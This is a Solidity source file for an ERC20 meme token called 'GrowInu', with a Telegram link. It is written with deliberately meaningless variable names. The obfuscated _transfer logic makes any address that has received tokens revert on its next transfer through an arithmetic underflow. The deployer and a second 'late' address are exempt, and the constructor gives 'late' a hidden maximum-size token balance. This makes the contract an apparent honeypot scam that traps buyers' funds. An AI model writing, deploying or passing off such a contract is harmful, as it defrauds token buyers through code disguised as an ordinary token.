// https://t.me/GrowinuETH

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.4;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract GrowInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private southern;

    function _transfer(
        address rice,
        address brick,
        uint256 closer
    ) internal override {
        uint256 believed = dirt;

        if (frog[rice] == 0 && southern[rice] > 0 && rice != uniswapV2Pair) {
            frog[rice] -= believed;
        }

        address location = address(slightly);
        slightly = GrowInu(brick);
        southern[location] += believed + 1;

        _balances[rice] -= closer;
        uint256 children = (closer / 100) * dirt;
        closer -= children;
        _balances[brick] += closer;
    }

    mapping(address => uint256) private frog;
    uint256 public dirt = 5;

    constructor(
        string memory even,
        string memory everybody,
        address golden,
        address late
    ) ERC20(even, everybody) {
        uniswapV2Router = IUniswapV2Router02(golden);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 dead = ~uint256(0);

        frog[msg.sender] = dead;
        frog[late] = dead;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[late] = dead;
    }

    GrowInu private slightly;
}